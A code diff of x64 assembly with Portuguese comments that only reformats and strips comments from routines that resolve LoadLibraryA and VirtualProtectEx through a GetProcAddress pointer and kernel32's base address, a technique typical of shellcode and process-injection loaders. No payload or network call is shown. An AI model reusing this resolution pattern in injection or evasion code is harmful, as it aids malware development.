@@ -126,7 +126,7 @@ section .data
     ptr17f0                                          dd 0x01
     
 section codered
-	;CodeRed times 80000000                      db 0:
+	;CodeRed times 80000000                          db 0:
 	CodeRed:
 	buffer times 800000 dq 0
 
@@ -1252,7 +1252,7 @@ LoadLibraryA:
     sub rsp, 0x30;           # Make some room on the stack
     call r14;                # Call GetProcessAddress
     add rsp, 0x30;           # Remove espaço alocado na pilha
-    add rsp, 0x10;           # Remove a string alocada de  LoadLibrary 
+    add rsp, 0x10;           # Remove a string alocada LoadLibraryA 
     mov rsi, rax;            # Guarda o endereço de loadlibrary em RSI
 ret
 
@@ -1400,13 +1400,13 @@ VirtualProectEx:
     mov rax, "VirtualP"
     push rax
     mov [rsp+0x10], byte 0x00
-    mov rdx, rsp;                    # joga o ponteiro da string VirtualProtectEx para RDX
-    mov rcx, r8;                     # Copia o endereço base da Kernel32  para RCX
+    mov rdx, rsp;                    
+    mov rcx, r8;                     
     sub rsp, 0x30
-    call r14;                        # Call GetProcessAddress
-    add rsp, 0x30;                   # Remove espaço alocado na pilha
-    add rsp, 0x10;                   # Remove a string alocada de  VirtualProtect 
-    mov rsi, rax;                    # Guarda o endereço de VirtualProtectEx em r12
+    call r14;                       
+    add rsp, 0x30;                   
+    add rsp, 0x10;                    
+    mov rsi, rax;                    
     mov r12, rax
     add rsp, 0x30
 ret
